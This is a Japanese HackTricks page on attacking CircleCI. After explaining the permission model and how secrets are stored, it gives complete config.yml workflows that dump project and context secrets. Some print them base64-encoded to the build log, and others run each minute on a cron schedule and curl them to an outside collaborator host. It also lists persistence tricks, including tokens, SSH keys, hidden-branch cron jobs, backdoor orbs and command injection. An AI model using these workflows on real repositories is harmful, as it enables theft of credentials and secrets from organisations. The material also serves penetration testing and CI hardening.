# CircleCI セキュリティ

<details>

<summary><strong>AWSハッキングをゼロからヒーローまで学ぶ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>！</strong></summary>

HackTricksをサポートする他の方法:

* **HackTricksにあなたの会社を広告したい**、または**HackTricksをPDFでダウンロードしたい**場合は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS & HackTricksグッズ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見する、私たちの独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクション
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)に**参加する**か、[**telegramグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)を**フォローする**。
* **HackTricks**の[**GitHubリポジトリ**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)にPRを提出して、あなたのハッキングのコツを共有する。

</details>

## 基本情報

[**CircleCI**](https://circleci.com/docs/2.0/about-circleci/)は、コードに対して何をし、いつ行うかを示す**テンプレートを定義**できる継続的インテグレーションプラットフォームです。これにより、例えば**リポジトリのマスターブランチから直接**、**テストの自動化**や**デプロイメント**を行うことができます。

## 権限

**CircleCI**は、ログインする**アカウント**に関連するgithubとbitbucketからの**権限を継承**します。\
私のテストでは、github上でリポジトリに**書き込み権限がある限り**、**CircleCIのプロジェクト設定を管理**できることがわかりました（新しいsshキーを設定、プロジェクトのAPIキーを取得、新しいCircleCI設定で新しいブランチを作成...）。

ただし、リポジトリをCircleCIプロジェクトに**変換するには**、**リポジトリの管理者**である必要があります。

## 環境変数とシークレット

[**ドキュメント**](https://circleci.com/docs/2.0/env-vars/)によると、ワークフロー内で環境変数に値を**読み込む**異なる方法があります。

### 組み込みの環境変数

CircleCIによって実行されるすべてのコンテナには、`CIRCLE_PR_USERNAME`、`CIRCLE_PROJECT_REPONAME`、`CIRCLE_USERNAME`など、[**ドキュメントで定義されている特定の環境変数**](https://circleci.com/docs/2.0/env-vars/#built-in-environment-variables)が常にあります。

### クリアテキスト

**コマンド**内でクリアテキストで宣言することができます：
```yaml
- run:
name: "set and echo"
command: |
SECRET="A secret"
echo $SECRET
```
**run environment**内で、それらをクリアテキストで宣言できます：
```yaml
- run:
name: "set and echo"
command: echo $SECRET
environment:
SECRET: A secret
```
**ビルドジョブ環境**内で、それらをクリアテキストで宣言できます：
```yaml
jobs:
build-job:
docker:
- image: cimg/base:2020.01
environment:
SECRET: A secret
```
コンテナの**環境**内で明文で宣言することができます：
```yaml
jobs:
build-job:
docker:
- image: cimg/base:2020.01
environment:
SECRET: A secret
```
### プロジェクトシークレット

これらは**プロジェクト**（**任意のブランチ**によって）のみが**アクセス可能**な**シークレット**です。\
_https://app.circleci.com/settings/project/github/\<org\_name>/\<repo\_name>/environment-variables_ で宣言されているのを見ることができます。

![](<../.gitbook/assets/image (50).png>)

{% hint style="danger" %}
"**Import Variables**" 機能により、他のプロジェクトから変数をこのプロジェクトに**インポート**することができます。
{% endhint %}

### コンテキストシークレット

これらは**組織全体**にわたるシークレットです。**デフォルトでは任意のリポジトリ**がここに保存されている**任意のシークレット**に**アクセス**できます：

![](<../.gitbook/assets/image (80).png>)

{% hint style="success" %}
ただし、All membersの代わりに異なるグループを**選択して、特定の人々にのみシークレットへのアクセスを許可**することができます。\
これは現在、シークレットのセキュリティを**強化する**ための最良の方法の一つであり、全員ではなく一部の人々だけがアクセスできるようにします。
{% endhint %}

## 攻撃

### クリアテキストシークレットの検索

VCS（例えばgithub）に**アクセス**がある場合、**各リポジトリの各ブランチ**の `.circleci/config.yml` ファイルをチェックし、そこに保存されている可能性のある**クリアテキストシークレット**を**検索**します。

### シークレット環境変数 & コンテキスト列挙

コードをチェックすると、各 `.circleci/config.yml` ファイルで**使用されている**すべての**シークレット名**を見つけることができます。また、これらのファイルから**コンテキスト名**を取得するか、ウェブコンソールでチェックすることもできます：_https://app.circleci.com/settings/organization/github/\<org\_name>/contexts_。

### プロジェクトシークレットの流出

{% hint style="warning" %}
プロジェクトとコンテキストの**すべてのシークレット**を**流出**させるには、github組織内の**たった1つのリポジトリ**に**書き込み**アクセス権があれば**十分**です（_そしてあなたのアカウントはコンテキストにアクセスする必要がありますが、デフォルトでは誰でもすべてのコンテキストにアクセスできます_）。
{% endhint %}

{% hint style="danger" %}
"**Import Variables**" 機能により、他のプロジェクトから変数をこのプロジェクトに**インポート**することができます。したがって、攻撃者は**すべてのリポジトリからすべてのプロジェクト変数をインポート**し、その後**一緒にすべてを流出**させることができます。
{% endhint %}

すべてのプロジェクトシークレットは常にジョブの環境変数に設定されているので、envを呼び出してbase64で難読化するだけで、**ワークフローウェブログコンソール**でシークレットを流出させることができます：
```yaml
version: 2.1

jobs:
exfil-env:
docker:
- image: cimg/base:stable
steps:
- checkout
- run:
name: "Exfil env"
command: "env | base64"

workflows:
exfil-env-workflow:
jobs:
- exfil-env
```
**ウェブコンソールにアクセスできない場合**でも、リポジトリに**アクセスできる**し、CircleCIが使用されていることがわかっているなら、**毎分トリガーされるワークフロー**を作成し、**シークレットを外部アドレスに抜き取る**ことができます：
```yaml
version: 2.1

jobs:
exfil-env:
docker:
- image: cimg/base:stable
steps:
- checkout
- run:
name: "Exfil env"
command: "curl https://lyn7hzchao276nyvooiekpjn9ef43t.burpcollaborator.net/?a=`env | base64 -w0`"

# I filter by the repo branch where this config.yaml file is located: circleci-project-setup
workflows:
exfil-env-workflow:
triggers:
- schedule:
cron: "* * * * *"
filters:
branches:
only:
- circleci-project-setup
jobs:
- exfil-env
```
### コンテキストシークレットの抽出

**コンテキスト名を指定する必要があります**（これによりプロジェクトのシークレットも抽出されます）：
```yaml
version: 2.1

jobs:
exfil-env:
docker:
- image: cimg/base:stable
steps:
- checkout
- run:
name: "Exfil env"
command: "env | base64"

workflows:
exfil-env-workflow:
jobs:
- exfil-env:
context: Test-Context
```
**ウェブコンソールへのアクセスがない**場合でも、**リポジトリへのアクセスがあり**、CircleCIが使用されていることがわかっている場合は、**毎分トリガーされるワークフロー**を変更して、**シークレットを外部アドレスにエクスフィル**することができます：
```yaml
version: 2.1

jobs:
exfil-env:
docker:
- image: cimg/base:stable
steps:
- checkout
- run:
name: "Exfil env"
command: "curl https://lyn7hzchao276nyvooiekpjn9ef43t.burpcollaborator.net/?a=`env | base64 -w0`"

# I filter by the repo branch where this config.yaml file is located: circleci-project-setup
workflows:
exfil-env-workflow:
triggers:
- schedule:
cron: "* * * * *"
filters:
branches:
only:
- circleci-project-setup
jobs:
- exfil-env:
context: Test-Context
```
{% hint style="warning" %}
新しい `.circleci/config.yml` をリポジトリに作成しても、**circleciビルドをトリガーするには不十分です**。**circleciコンソールでプロジェクトとして有効にする必要があります**。
{% endhint %}

### クラウドへの脱出

**CircleCI** では、**ビルドを自分のマシンで実行するか、またはCircleCIのマシンで実行するか** を選択できます。\
デフォルトでは、彼らのマシンはGCPに位置しており、初期には関連するものを見つけることはできません。しかし、被害者が **自分のマシンでタスクを実行している場合（潜在的にはクラウド環境で）**、**クラウドメタデータエンドポイントに興味深い情報が含まれている可能性があります**。

前の例では、すべてをdockerコンテナ内で起動しましたが、**VMマシンを起動するように要求することもできます**（異なるクラウド権限を持つかもしれません）：
```yaml
jobs:
exfil-env:
#docker:
#  - image: cimg/base:stable
machine:
image: ubuntu-2004:current
```
または、リモートのdockerサービスにアクセスできるdockerコンテナでも:
```yaml
jobs:
exfil-env:
docker:
- image: cimg/base:stable
steps:
- checkout
- setup_remote_docker:
version: 19.03.13
```
### 永続性

* **CircleCIでユーザートークンを作成**し、ユーザーアクセス権を持つAPIエンドポイントにアクセスすることが可能です。
* _https://app.circleci.com/settings/user/tokens_
* **プロジェクトトークンを作成**し、トークンに与えられた権限でプロジェクトにアクセスすることが可能です。
* _https://app.circleci.com/settings/project/github/\<org>/\<repo>/api_
* プロジェクトに**SSHキーを追加**することが可能です。
* _https://app.circleci.com/settings/project/github/\<org>/\<repo>/ssh_
* 予期せぬプロジェクトの**隠されたブランチにcronジョブを作成**し、毎日**context env**変数を**漏洩**させることが可能です。
* または、既知のジョブを変更または特定のブランチに作成し、毎日contextと**プロジェクトの秘密**を**漏洩**させることも可能です。
* githubのオーナーであれば、**検証されていないorbsを許可**し、ジョブ内で**バックドア**として設定することができます。
* あるタスクに**コマンドインジェクションの脆弱性**を見つけ、**秘密**の値を変更して**コマンドを注入**することができます。

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)で<strong>AWSハッキングをゼロからヒーローまで学ぶ</strong></a><strong>!</strong></summary>

HackTricksをサポートする他の方法:

* **HackTricksにあなたの会社を広告したい**、または**HackTricksをPDFでダウンロードしたい**場合は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS & HackTricksグッズ**](https://peass.creator-spring.com)を入手してください。
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションをチェックしてください。
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)に**参加する**か、[**telegramグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)を**フォロー**してください。
* [**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のgithubリポジトリにPRを提出して、あなたのハッキングのコツを**共有**してください。

</details>
